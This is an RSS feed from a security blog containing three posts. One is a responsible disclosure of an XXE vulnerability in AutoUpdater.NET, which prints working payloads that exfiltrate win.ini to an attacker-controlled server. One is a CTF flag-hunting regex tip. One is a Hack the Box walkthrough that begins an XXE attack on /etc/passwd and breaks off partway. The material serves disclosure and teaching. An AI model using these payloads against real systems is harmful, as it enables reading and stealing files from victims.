@@ -1,0 +1,2290 @@
+
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+	xmlns:georss="http://www.georss.org/georss"
+	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+	>
+
+<channel>
+	<title>doyler.net</title>
+	<atom:link href="https://www.doyler.net/feed" rel="self" type="application/rss+xml" />
+	<link>https://www.doyler.net</link>
+	<description></description>
+	<lastBuildDate>Sat, 28 Mar 2020 20:19:32 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.4</generator>
+<site xmlns="com-wordpress:feed-additions:1">90191124</site>	<item>
+		<title>AutoUpdater Vulnerability &#8211; XXE Injection (CVE-2019-20627)</title>
+		<link>https://www.doyler.net/security-not-included/autoupdater-net-vulnerability</link>
+					<comments>https://www.doyler.net/security-not-included/autoupdater-net-vulnerability#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 28 Mar 2020 16:00:55 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4462</guid>
+
+					<description><![CDATA[<p>I recently found an AutoUpdater Vulnerability, and I am now ready to publish it. AutoUpdater Vulnerability - Introduction The AutoUpdater.NET version 1.5.7 library is vulnerable to an XXE injection attack. This is a popular library, based on the GitHub statistics. &#8230; <a href="https://www.doyler.net/security-not-included/autoupdater-net-vulnerability">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/autoupdater-net-vulnerability">AutoUpdater Vulnerability &#8211; XXE Injection (CVE-2019-20627)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I recently found an AutoUpdater Vulnerability, and I am now ready to publish it.</p>
+<p><span id="more-4462"></span></p>
+<h2>AutoUpdater Vulnerability - Introduction</h2>
+<p>The <a href="https://github.com/ravibpatel/AutoUpdater.NET">AutoUpdater.NET</a> version 1.5.7 library is vulnerable to an XXE injection attack.</p>
+<p>This is a popular library, based on the GitHub statistics.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats.png"><img src="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats-1024x61.png" alt="AutoUpdater Vulnerability - GitHub stats" width="500" height="30" class="alignnone size-large wp-image-4552" srcset="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats-1024x61.png 1024w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats-300x18.png 300w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats-768x45.png 768w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-1-stats.png 1032w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>I found the vulnerability easily, but the developer was quick to respond and <a href="https://github.com/ravibpatel/AutoUpdater.NET/commit/1dc25f2bea6ea522dbac1512b5563c4746d539c3">patch</a> the issue.</p>
+<p>I ran across this library while testing a different application, so hopefully I can share those vulnerabilities soon as well.</p>
+<p>The format will be like my <a href="https://www.doyler.net/security-not-included/natemail-vulnerabilities">NateMail</a> disclosure, but please let me know if you have any suggestions or updates.</p>
+<h2>Improper Restriction of XML External Entity Reference (CVE-2019-20627)</h2>
+<h3>Detailed Information</h3>
+<p>An XML external entity (XXE) vulnerability in the RBSoft AutoUpdater.NET version 1.5.7 application allows an attacker to cause a denial of service, conduct SMB Relay attacks, reach internal network endpoints, or access arbitrary files via a malicious update.xml file.</p>
+<p>First, the tester built a demo application to verify the updater functionality. The following demo points AutoUpdater to a server under the tester’s control, for demo purposes.</p>
+<pre class="console">
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+
+<span class="highlight">using AutoUpdaterDotNET;</span>
+
+namespace UpdaterTest
+{
+    /// &lt;summary&gt;
+    /// Interaction logic for MainWindow.xaml
+    /// &lt;/summary&gt;
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+        }
+
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            <span class="highlight">AutoUpdater.Start("http://r4y.pw/update.xml");</span>
+        }
+    }
+}
+</pre>
+<p>Next, the tester created a malicious update.xml file, based on the RBSoft supplied example. As you can see, this references an external DTD on the Burp Collaborator server.</p>
+<pre class="console">
+&lt;?xml version="1.0" ?&gt;
+  <span class="highlight">&lt;!DOCTYPE root [
+  &lt;!ENTITY % ext SYSTEM "http://l9v77vu7hd6scxvor5azndsuul0bo0.burpcollaborator.net/x"&gt; %ext;</span>
+]&gt;
+
+&lt;item&gt;
+    &lt;version&gt;2.0.0.0&lt;/version&gt;
+    &lt;url&gt;http://rbsoft.org/downloads/AutoUpdaterTest.zip&lt;/url&gt;
+    &lt;changelog&gt;https://github.com/ravibpatel/AutoUpdater.NET/releases&lt;/changelog&gt;
+    &lt;mandatory&gt;false&lt;/mandatory&gt;
+&lt;/item&gt;
+</pre>
+<p>The following screenshot shows the application making requests to the Collaborator server.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab.png"><img src="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab-1024x394.png" alt="AutoUpdater Vulnerability - Collaborator" width="500" height="192" class="alignnone size-large wp-image-4550" srcset="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab-1024x394.png 1024w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab-300x115.png 300w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab-768x295.png 768w, https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-2-collab.png 1488w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>The following raw HTTP request and response demonstrates the application calling out to the Collaborator server.</p>
+<p><b>Raw Request</b></p>
+<pre class="console">
+GET /x HTTP/1.1
+<span class="highlight">Host: l9v77vu7hd6scxvor5azndsuul0bo0.burpcollaborator.net</span>
+Connection: Keep-Alive
+</pre>
+<p><b>Raw Response</b></p>
+<pre class="console">
+HTTP/1.1 200 OK
+Server: Burp Collaborator https://burpcollaborator.net/
+X-Collaborator-Version: 4
+Content-Type: text/html
+Content-Length: 53
+
+&lt;html&gt;&lt;body&gt;eqgf4fyz7yxbjo9bm56x9uzjigz&lt;/body&gt;&lt;/html&gt;
+</pre>
+<p>With some modifications, the tester declared an external DTD, to show data exfiltration of the wini.ini file. You can find the modified update.xml file below.</p>
+<pre class="console">
+<span class="highlight">&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE r [
+  &lt;!ELEMENT r ANY &gt;
+  &lt;!ENTITY % sp SYSTEM "http://r4y.pw/evil.dtd"&gt;
+  %sp;
+  %param1;
+]&gt;
+
+&lt;r&gt;&exfil;&lt;/r&gt;</span>
+
+&lt;item&gt;
+    &lt;version&gt;2.0.0.0&lt;/version&gt;
+    &lt;url&gt;http://rbsoft.org/downloads/AutoUpdaterTest.zip&lt;/url&gt;
+    &lt;changelog&gt;https://github.com/ravibpatel/AutoUpdater.NET/releases&lt;/changelog&gt;
+    &lt;mandatory&gt;false&lt;/mandatory&gt;
+&lt;/item&gt;
+</pre>
+<p>Additionally, you can find the contents of the evil.dtd below. As you can see, the DTD loads the win.ini file, and then sends it back to the attacker-controlled server.</p>
+<pre class="console">
+&lt;!ENTITY % data SYSTEM "<span class="highlight">file:///c:/windows/win.ini</span>"&gt;
+&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM <span class="highlight">'http://r4y.pw/%data;'</span>&gt;"&gt;
+</pre>
+<p>The following HTTP server logs show the request for update.xml by AutoUpdater, followed be the request for the evil.dtd, and finally the request with exfiltrated win.ini file.</p>
+<pre class="console">
+70.x.x.x - - [29/Oct/2019:00:07:16 +0000] "<span class="highlight">GET /update.xml</span> HTTP/1.1" 200 683 "-" "AutoUpdater.NET"
+70.x.x.x - - [29/Oct/2019:00:07:16 +0000] "<span class="highlight">GET /evil.dtd</span> HTTP/1.1" 200 324 "-" "-"
+70.x.x.x - - [29/Oct/2019:00:07:16 +0000] "<span class="highlight">GET /;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1%0D%0A%5BMCI%20Extensions.BAK%5D%0D%0A3g2=MPEGVideo%0D%0A3gp=MPEGVideo%0D%0A3gp2=MPEGVideo%0D%0A3gpp=MPEGVideo%0D%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo%0D%0Amod=MPEGVideo%0D%0Amov=MPEGVideo%0D%0Amp4=MPEGVideo%0D%0Amp4v=MPEGVideo%0D%0Amts=MPEGVideo%0D%0Ats=MPEGVideo%0D%0Atts=MPEGVideo</span> HTTP/1.1" 403 432 "-" "-"
+</pre>
+<h3>Affected URLs and Parameters / Limiting Factors</h3>
+<p>The entire AppCast XML file is the vulnerable injection point.</p>
+<p>Due to the application pointing to a specific update.xml file, an attacker would need to either point the update to a malicious update.xml file, or man-in-the-middle the connection and modify the update.xml file in transit.</p>
+<h3>Recommendations</h3>
+<p>The safest way to prevent XXE is always to disable DTDs (External Entities) completely. In this case, as the library is using the .NET XmlDocument, the xmlDoc.XmlResolver should be set to null. Note that updating the target framework to .Net 4.6 will cause this behavior by default.</p>
+<p>For more information, please see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XXE Prevention Cheat Sheet</a>.</p>
+<h3>AutoUpdater Vulnerability - Severity</h3>
+<p>Severity: <font color="#FF0000">High</font></p>
+<p><b>CVSSv3</b></p>
+<p>8.3 (<a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L">CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L</a>)</p>
+<p><b>Damage</b></p>
+<p>An attacker can use this vulnerability to compromise the confidentiality of the system running the AutoUpdater application and/or lead to exploitation of the victim’s system.</p>
+<p><b>Reproducibility</b></p>
+<p>This attack is easily reproducible and will work on any application using AutoUpdater.NET up to version 1.5.7.</p>
+<p><b>Exploitability</b></p>
+<p>If an attacker can host a malicious update.xml file, or change a target update.xml file in transit, then the attack is easily automated.</p>
+<h2>AutoUpdater Vulnerability - Disclosure Timeline</h2>
+<p><b>10/29/2019</b> - Initial attempt to contact vendor.<br />
+<b>10/30/2019</b> - Initial vendor contact to discuss secure communication channel.<br />
+<b>10/30/2019</b> - Initial disclosure to vendor.<br />
+<b>10/31/2019</b> - Vendor acknowledged and patched.<br />
+<b>10/31/2019</b> - CVE requested.<br />
+<b>12/3/2019</b> - CVE updates sent, and status requested.<br />
+<b>1/10/2020</b> - CVE again requested.<br />
+<b>3/22/2020</b> - CVE AGAIN requested, using a different e-mail address.<br />
+<b>3/23/2020</b> - CVE assigned (CVE-2019-20627).<br />
+<b>3/28/2020</b> - This post published.</p>
+<h2>AutoUpdater Vulnerability - Patched</h2>
+<p>Finally, just one day after I sent my disclosure to the developer, they <a href="https://github.com/ravibpatel/AutoUpdater.NET/commit/1dc25f2bea6ea522dbac1512b5563c4746d539c3">committed a patch</a>.</p>
+<p>Also, I got an advance release of version 1.5.8 to test the fix.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-3-updated.png"><img src="https://www.doyler.net/wp-content/uploads/autoUpdater/autoUpdater-3-updated.png" alt="AutoUpdater Vulnerability - Patched" width="161" height="271" class="alignnone size-full wp-image-4551" /></a></p>
+<p>As expected, the application only made a request for update.xml, and not my malicious DTD files.</p>
+<pre class="console">
+174.x.x.x - - [31/Oct/2019:14:49:34 +0000] "GET /update.xml HTTP/1.1" 200 683 "-" "AutoUpdater.NET"
+</pre>
+<h2>AutoUpdater Vulnerability - Conclusion</h2>
+<p>This was a cool vulnerability, and it was great to find XXE in the wild again.</p>
+<p>I'm getting a better handle on the CVE process, but sometimes it can take a long time to get a response. I still have more vulnerabilities in the works, so stay tuned.</p>
+<p>If you have any ideas for research or posts, then please let me know!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/autoupdater-net-vulnerability">AutoUpdater Vulnerability &#8211; XXE Injection (CVE-2019-20627)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/autoupdater-net-vulnerability/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4462</post-id>	</item>
+		<item>
+		<title>CTF Regex for Flags and Victory (DerbyCon 2019)</title>
+		<link>https://www.doyler.net/security-not-included/ctf-regex</link>
+					<comments>https://www.doyler.net/security-not-included/ctf-regex#comments</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Tue, 24 Mar 2020 20:08:43 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4350</guid>
+
+					<description><![CDATA[<p>We have been using some CTF regex recently, and I thought it was worth sharing. CTF Regex - Introduction During our first DerbyCon CTF, we ended up missing a few flags that could have gotten us the win. While that &#8230; <a href="https://www.doyler.net/security-not-included/ctf-regex">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/ctf-regex">CTF Regex for Flags and Victory (DerbyCon 2019)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>We have been using some CTF regex recently, and I thought it was worth sharing.</p>
+<p><span id="more-4350"></span></p>
+<h2>CTF Regex - Introduction</h2>
+<p>During our first <a href="https://www.doyler.net/security-not-included/derbycon-6-recharge">DerbyCon</a> CTF, <a href="https://twitter.com/EverSecCTF/">we</a> ended up missing a few flags that could have gotten us the win.</p>
+<p>While that stung, we wanted to make sure it didn't happen again. For this specific issue, we had our regex guru, <a href="https://twitter.com/recviking">RecViking</a>, get to work on a solution.</p>
+<p>In the end, he whipped together a one-liner for us to use, and I ended up finding at least one new flag with it during our <a href="https://www.doyler.net/security-not-included/derbycon-9-finish-line">DerbyCon 9 victory</a>!</p>
+<h2>DerbyCon Flags</h2>
+<p>If you've never competed in a <a href="https://www.doyler.net/security-not-included/derbycon-8-evolution">DerbyCon CTF</a>, then the following is an example of what the flags look like.</p>
+<pre class="console">
+NiceIDORExploitYo349
+</pre>
+<p>These flags are camel case, long, and have some numbers in the middle/at the end.</p>
+<p>You can find the command that RecViking came up below to find these for us. Note that this will search the entire disk, but you can narrow it down to specific directories if you'd like.</p>
+<pre class="console">
+egrep -r -o -e "[A-Z]([A-Z0-9]*[a-z][a-z0-9]*[A-Z]|[a-z0-9]*[A-Z][A-Z0-9]*[a-z])[A-Za-z0-9]*" / | sed -n '/.\{12\}/p' | sort | uniq
+</pre>
+<p>The grep command will look for camel case patterns that might resemble flags, and then the sed command just narrows down the results to anything over 12 characters. We ran into a lot of broken ASCII inside of binary files, and all the flags that we had saved were at least 14 characters.</p>
+<p>As I'm not the regex expert, I recommend you check out the explanation on <a href="https://regex101.com/r/2uhpbP/1">regex101</a> if you want to understand it further.</p>
+<h2>CTF Regex - Testing the Command</h2>
+<p>While I do not have all the flags from the DerbyCon 9 CTF, I did grab some from our Trello board.</p>
+<pre class="console">
+FinalLap
+RedDot
+DoesNotMatter
+PapersPlease
+PapersPlease
+DerpMail
+Kc57LovesDotNetObfuscation
+Kc57Kc57Kc57Kc57
+StormbeatherintheUncannyX-Men170
+TheRedirectMasta
+PerlFTWLarryRules
+IReadYourEmails7331
+DESTROYallSOFtWare!!
+Mutantsgotclawsinthe212
+GeneNationandthe198
+IceIceBabyIceCubeIceT993
+OMGCanHazSomePointz2332
+HerpDerp8234DerpHerp
+ItIsIllegalToHackDis23444
+DerpyAdm
+fileserve
+files
+DerpyConIzDaB3stConferenceEVAR1337
+NiceIDORExploitYo349
+DerpyDB
+HerpDerpyConAdmin
+D3rpyC0n
+Congr4tzYouG0t@Dm1n8888
+TableNameForBigMoney777858
+ColumnNameForTheWin939
+IfYouGotThisYouAreAmazing999333
+YouAreTheTrueSQLMaster77727
+YouReadTheSourceCodeDerpDerp
+ATicketToTheShow
+WooYouAreAStaffMember
+WooYouGotIn!
+WellYouAreOnTheConsoleNowMyFriend
+DoesAnyoneRememberPwndU
+DerpyCon
+HeyYouDeserveAFlagForYourWebShell
+AhYouHaveUsedTheSrcLuke
+OkNowYouRootedMyBoxDadGum
+GoodYoureStillReadingHTMLComments
+WebminOnTheBeach
+ProcFlagProcFlagProc
+R007LOGINSHELLZ
+LOGINSHELLZ
+DoesNotMatter
+AmaraAquillafromBC44
+Livingunderthe10110
+</pre>
+<p>I'm not certain which of these were found with our one-liner, but I know that at least one was.</p>
+<p>While these flags were obviously in different file types, grep would be able to search my test file just fine.</p>
+<pre class="console">
+doyler@mbp:~/Documents/grep$ sort -u test.txt | wc -l
+      48
+</pre>
+<p>When I ran this command in my test directory, I managed to find 87.5% (42/48) of my saved flags!</p>
+<pre class="console">
+doyler@mbp:~/Documents/grep$ egrep -r -o -e "[A-Z]([A-Z0-9]*[a-z][a-z0-9]*[A-Z]|[a-z0-9]*[A-Z][A-Z0-9]*[a-z])[A-Za-z0-9]*" ./ | sed -n '/.\{12\}/p' | sort | uniq
+.//test.txt:ATicketToTheShow
+.//test.txt:AhYouHaveUsedTheSrcLuke
+.//test.txt:AmaraAquillafromBC44
+.//test.txt:ColumnNameForTheWin939
+.//test.txt:Congr4tzYouG0t
+.//test.txt:D3rpyC0n
+.//test.txt:DESTROYallSOFtWare
+.//test.txt:DerpMail
+.//test.txt:DerpyAdm
+.//test.txt:DerpyCon
+.//test.txt:DerpyConIzDaB3stConferenceEVAR1337
+.//test.txt:DerpyDB
+.//test.txt:DoesAnyoneRememberPwndU
+.//test.txt:DoesNotMatter
+.//test.txt:FinalLap
+.//test.txt:GeneNationandthe198
+.//test.txt:GoodYoureStillReadingHTMLComments
+.//test.txt:HerpDerp8234DerpHerp
+.//test.txt:HerpDerpyConAdmin
+.//test.txt:HeyYouDeserveAFlagForYourWebShell
+.//test.txt:IReadYourEmails7331
+.//test.txt:IceIceBabyIceCubeIceT993
+.//test.txt:IfYouGotThisYouAreAmazing999333
+.//test.txt:ItIsIllegalToHackDis23444
+.//test.txt:Kc57Kc57Kc57Kc57
+.//test.txt:Kc57LovesDotNetObfuscation
+.//test.txt:NiceIDORExploitYo349
+.//test.txt:OMGCanHazSomePointz2332
+.//test.txt:OkNowYouRootedMyBoxDadGum
+.//test.txt:PapersPlease
+.//test.txt:PerlFTWLarryRules
+.//test.txt:ProcFlagProcFlagProc
+.//test.txt:RedDot
+.//test.txt:StormbeatherintheUncannyX
+.//test.txt:TableNameForBigMoney777858
+.//test.txt:TheRedirectMasta
+.//test.txt:WebminOnTheBeach
+.//test.txt:WellYouAreOnTheConsoleNowMyFriend
+.//test.txt:WooYouAreAStaffMember
+.//test.txt:WooYouGotIn
+.//test.txt:YouAreTheTrueSQLMaster77727
+.//test.txt:YouReadTheSourceCodeDerpDerp
+doyler@mbp:~/Documents/grep$ egrep -r -o -e "[A-Z]([A-Z0-9]*[a-z][a-z0-9]*[A-Z]|[a-z0-9]*[A-Z][A-Z0-9]*[a-z])[A-Za-z0-9]*" ./ | sed -n '/.\{12\}/p' | sort | uniq | wc -l
+      42
+</pre>
+<p>When I inverted the matches, I was able to see the six flags that my command did not not return.</p>
+<pre class="console">
+doyler@mbp:~/Documents/grep$ egrep -r -o -v "[A-Z]([A-Z0-9]*[a-z][a-z0-9]*[A-Z]|[a-z0-9]*[A-Z][A-Z0-9]*[a-z])[A-Za-z0-9]*" ./ | sed -n '/.\{12\}/p' | sort | uniq | wc -l
+       6
+doyler@mbp:~/Documents/grep$ egrep -r -o -v "[A-Z]([A-Z0-9]*[a-z][a-z0-9]*[A-Z]|[a-z0-9]*[A-Z][A-Z0-9]*[a-z])[A-Za-z0-9]*" ./ | sed -n '/.\{12\}/p' | sort | uniq
+.//test.txt:LOGINSHELLZ
+.//test.txt:Livingunderthe10110
+.//test.txt:Mutantsgotclawsinthe212
+.//test.txt:R007LOGINSHELLZ
+.//test.txt:files
+.//test.txt:fileserve
+</pre>
+<p>As you can see, these flags were either not long enough, or not quite camel case.</p>
+<h2>Other CTFs</h2>
+<p>This strategy is even more useful in CTFs with a standard flag format.</p>
+<p>For example, here is an example of me running this command during a CTF that RecViking was setting up.</p>
+<pre class="console">
+ctfuser@ip-172-26-10-254:~$ egrep -r -o -e "flag{.*" / 2&gt;/dev/null | sed -n '/.\{12\}/p' | sort | uniq
+/home/ctfuser/.bash_history:flag{FLAG GOES HERE}
+/home/ctfuser/.bashrc:flag{FLAG GOES HERE}
+/home/ctfuser2/flag.txt:flag{FLAG GOES HERE}
+/usr/bin/find:flag{FLAG GOES HERE}
+/usr/bin/find:flag{FLAG GOES HERE}"
+/usr/bin/nmap:flag{FLAG GOES HERE}
+/usr/bin/nmap:flag{FLAG GOES HERE}"
+/var/skel/.bash_history:flag{FLAG GOES HERE}
+/var/skel/.bashrc:flag{FLAG GOES HERE}
+/var/www/html/admin/index.html:flag{FLAG GOES HERE}
+/var/www/html/index.html:flag{FLAG GOES HERE}
+/var/www/html/robots.txt:flag{FLAG GOES HERE}: /
+Binary file /proc/1361/cmdline matches
+Binary file /proc/1361/task/1361/cmdline matches
+Binary file /var/cache/snapd/commands.db matches
+</pre>
+<p>While this will not work in most Jeopardy style CTFs, it is great to run for something that is scenario-based, like our <a href="https://twitter.com/EverSecCTF/">EverSec CTF</a>. </p>
+<h2>CTF Regex - Conclusion</h2>
+<p>This was a command that we got from RecViking, but I wanted to share it now that DerbyCon is over.</p>
+<p>While less relevant to my future CTFs, I also thought about trying to use something like <a href="https://seanthegeek.net/257/install-yara-write-yara-rules/">YARA rules</a> to do something similar.</p>
+<p>If you have any other examples of indirectly searching for flags, then I'd love to hear them!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/ctf-regex">CTF Regex for Flags and Victory (DerbyCon 2019)</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/ctf-regex/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4350</post-id>	</item>
+		<item>
+		<title>Hack the Box DevOops Walkthrough &#8211; XXE FTW</title>
+		<link>https://www.doyler.net/security-not-included/hack-the-box-devoops</link>
+					<comments>https://www.doyler.net/security-not-included/hack-the-box-devoops#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 21 Mar 2020 16:00:58 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4619</guid>
+
+					<description><![CDATA[<p>While it was a bit ago, I also solved the Hack the Box DevOops box. Hack the Box DevOops - Introduction DevOops was my second HtB solve, after I finished Nibbles. This was a fun box, and I always love &#8230; <a href="https://www.doyler.net/security-not-included/hack-the-box-devoops">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/hack-the-box-devoops">Hack the Box DevOops Walkthrough &#8211; XXE FTW</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>While it was a bit ago, I also solved the Hack the Box DevOops box.</p>
+<p><span id="more-4619"></span></p>
+<h2>Hack the Box DevOops - Introduction</h2>
+<p>DevOops was my second HtB solve, after I finished <a href="https://www.doyler.net/security-not-included/hack-the-box-nibbles">Nibbles</a>.</p>
+<p>This was a fun box, and I always love playing with XXE.</p>
+<p>I think that my 30-day access is over, but I may eventually reactivate if I have time.</p>
+<h2>Enumeration</h2>
+<p>First, I found that port 22 and 5000 were open on the server.</p>
+<pre class="console">
+Nmap scan report for 10.10.10.91
+Host is up (0.041s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Gunicorn 19.7.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=12/19%OT=22%CT=1%CU=43691%PV=Y%DS=2%DC=I%G=Y%TM=5DFBD1
+OS:6B%P=x86_64-apple-darwin18.6.0)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%T
+OS:S=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=
+OS:M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7
+OS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
+OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
+OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
+OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
+OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
+OS:T=40%CD=S)
+</pre>
+<p>Since it seemed like a likely foothold, I looked at <a href="http://10.10.10.91:5000/">. This was an under-construction page that mentioned a feed.py file.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction.png"><img src="https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction-1024x823.png" alt="Hack the Box DevOops - Under construction" width="500" height="402" class="alignnone size-large wp-image-4768" srcset="https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction-1024x823.png 1024w, https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction-300x241.png 300w, https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction-768x617.png 768w, https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction-1536x1234.png 1536w, https://www.doyler.net/wp-content/uploads/devOops/devoops-1-underConstruction.png 1710w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>After scanning for more files or folders, I found the <a href="http://10.10.10.91:5000/upload">http://10.10.10.91:5000/upload</a> directory.</p>
+<p>This was a test API that took an XML file upload, which seemed promising.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/devOops/devoops-2-upload.png"><img src="https://www.doyler.net/wp-content/uploads/devOops/devoops-2-upload.png" alt="Hack the Box DevOops - Upload" width="858" height="438" class="alignnone size-full wp-image-4769" srcset="https://www.doyler.net/wp-content/uploads/devOops/devoops-2-upload.png 858w, https://www.doyler.net/wp-content/uploads/devOops/devoops-2-upload-300x153.png 300w, https://www.doyler.net/wp-content/uploads/devOops/devoops-2-upload-768x392.png 768w" sizes="(max-width: 858px) 100vw, 858px" /></a></p>
+<h2>Hack the Box DevOops - Exploitation</h2>
+<p>With an XML file upload, I figured that <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">XXE Injection</a> would be my initial foothold.</p>
+<p>First, I tried to read /etc/passwd with a basic XML file.</p>
+<pre class="console">
+POST /upload HTTP/1.1
+Host: 10.10.10.91:5000
+Content-Length: 414
+Cache-Control: max-age=0
+Origin: http://10.10.10.91:5000
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymfAR6unm6rnoKPEA
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3910.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://10.10.10.91:5000/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarymfAR6unm6rnoKPEA
+Content-Disposition: form-data; name="file"; filename="test.xml"
+Content-Type: text/xml
+
